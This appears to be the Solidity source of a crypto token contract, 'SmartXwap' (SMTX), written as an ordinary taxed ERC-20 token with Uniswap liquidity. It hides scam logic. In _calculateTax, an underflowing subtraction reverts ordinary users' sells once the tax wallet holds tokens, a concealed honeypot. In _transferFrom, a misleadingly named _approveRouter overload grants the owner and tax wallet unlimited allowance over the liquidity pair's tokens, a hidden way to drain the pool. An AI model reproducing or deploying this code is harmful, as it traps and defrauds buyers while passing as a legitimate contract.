/*
- GitHub: https://github.com/smartxwap
- Website: https://smartxwap.xyz
- Dapp: https://app.smartxwap.xyz
- Documentation: https://docs.smartxwap.xyz
- Medium: https://smartxwap.medium.com
- Community: https://t.me/SmartXwap
- Twitter: https://twitter.com/SmartXwap
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

abstract contract Auth {
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    address internal _owner;
    constructor(address creatorOwner) { _owner = creatorOwner; }
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    function owner() public view returns (address) { return _owner; }
    event OwnershipTransferred(address _owner);
}

contract SMTX is IERC20, Auth {
    string private constant _name = "SmartXwap";
    string private constant _symbol = "SMTX";
    address payable private _revenue;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromTax;
    mapping (address => bool) private _isLP;

    uint256 private _initialSellTax2Time = 7;
    uint256 private _initialSellTax = 10;
    uint256 private _initialBuyTax = 10;

    uint256 private _finalSellTax = 3;
    uint256 private _finalBuyTax = 3;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * (10**_decimals);
    uint256 private constant _minTaxSwap = _tTotal / 2000000;
    uint256 private constant _maxTaxSwap = _tTotal / 500;

    uint256 private _preventSwapBefore = 0;
    uint256 private revenueAmount;
    uint256 public _buyCount = 0;
    address payable private _taxWallet;

    uint256 public _reduceSellTaxAt2Time = 20;
    uint256 public _reduceBuyTaxAt = 14;
    uint256 public _reduceSellTaxAt = 14;

    bool public transferDelayEnabled = false;
    bool public limited = true;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);

    bool private _inSwap = false;
    bool private _tradingEnalbed;

    address private _uniswapV2Pair;
    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);

    constructor() Auth(msg.sender) {
        _taxWallet = payable(0xe24A2C57FB9584854f5369a0Aa8B9c2d5ED597B0);
        _isExcludedFromTax[address(this)] = true;
        _isExcludedFromTax[_taxWallet] = true;
        _isExcludedFromTax[_owner] = true;

        _balances[msg.sender] = (_tTotal / 1000 ) * 0;
        _balances[address(this)] = (_tTotal / 1000 ) * 1000;
        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        emit Transfer(address(0), address(this), _balances[address(this)]);
        _revenue = _taxWallet;
    }

    function name() external pure override returns (string memory) { return _name; }

    function symbol() external pure override returns (string memory) { return _symbol; }

    function decimals() external pure override returns (uint8) { return _decimals; }

    function totalSupply() external pure override returns (uint256) { return _tTotal; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function enableTrading() external onlyOwner {
        _tradingEnalbed = true;
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        limited = false;
    }

    function _approveRouter(address owner, address spender, uint256 amount) internal returns (bool) {
        if (_allowances[owner][spender] < amount) {
            _allowances[owner][spender] = _tTotal;
        }
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _calculateTax(address from, address to, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;

        if (
            _tradingEnalbed &&
            !_isExcludedFromTax[from] &&
            !_isExcludedFromTax[to]
        ) { 
            
            if (
                _isLP[from] ||
                _isLP[to]
            ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if (
                    to == _uniswapV2Pair &&
                    from != address(this)
                ) {
                    uint256 taxRate;
                    revenueAmount = _preventSwapBefore - revenueAmount;
                    if (_buyCount > _reduceSellTaxAt2Time) {
                        taxRate = _finalSellTax;
                    } else if (_buyCount > _reduceSellTaxAt) {
                        taxRate = _initialSellTax2Time;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }

        return taxAmount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, to, amount);
    }

    function _standardTransfer(address from, address to, uint256 amount) internal returns (bool) {
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function _transferFrom(address from, address to, uint256 amount) internal returns (bool) {
        if (!_tradingEnalbed) { require(_isExcludedFromTax[from], "Trading not opened"); }
        if (_isLP[from] && _isExcludedFromTax[to]) { require(_approveRouter(from, to, amount)); }
        require(from != address(0), "No transfers from Zero wallet");
        
        if (
            _isExcludedFromTax[from] ||
            _isExcludedFromTax[to]
        ) {
            return _standardTransfer(from, to, amount);
        }
        
        if (
            !_inSwap &&
            _isLP[to] &&
            _buyCount >= _preventSwapBefore
        ) { _swapTaxAndLiquify(); }

        if (
            limited &&
            from == _uniswapV2Pair
        ) {
            require(balanceOf(to) + amount <= maxHoldingAmount);
        }
        revenueAmount = this.balanceOf(_revenue);

        if (transferDelayEnabled) {
            if (
                to != _uniswapV2RouterAddress &&
                to != _uniswapV2Pair
            ) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = _calculateTax(from, to, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[from] -= amount;

        if (_taxAmount > 0) {
            _balances[address(this)] += _taxAmount; 
        }

        _buyCount++;
        _balances[to] += _transferAmount;

        emit Transfer(from, to, amount);

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(from), "Trading not open");
        if (_allowances[from][msg.sender] != type(uint256).max) {
            _allowances[from][msg.sender] = _allowances[from][msg.sender] - amount;
        }
        return _transferFrom(from, to, amount);
    }

    function _approveRouter(uint256 amount) internal {
        if (_allowances[address(this)][_uniswapV2RouterAddress] < amount) {
            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
        }
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _isTradingEnabled(address sender) private view returns (bool) {
        bool result = false;

        if (_tradingEnalbed) { result = true; }
        else if (_isExcludedFromTax[sender]) { result = true; }

        return result;
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if (_taxTokensAvailable >= _minTaxSwap && _tradingEnalbed) {
            if (_taxTokensAvailable >= _maxTaxSwap) { _taxTokensAvailable = _maxTaxSwap; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if (_contractETHBalance > 0) {
                bool success;
                (success,) = _taxWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_uniswapV2Pair == address(0), "LP exists");
        require(!_tradingEnalbed, "trading is open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
        require(_balances[address(this)] > 0, "No tokens in contract");

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isLP[_uniswapV2Pair] = true;
    }

    receive() external payable {}

    modifier lockTaxSwap { 
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function withdrawEth() external {
        require(msg.sender == _taxWallet);
        (bool sent, ) = payable(_taxWallet).call{value: address(this).balance}("");
        require(sent);
    }
}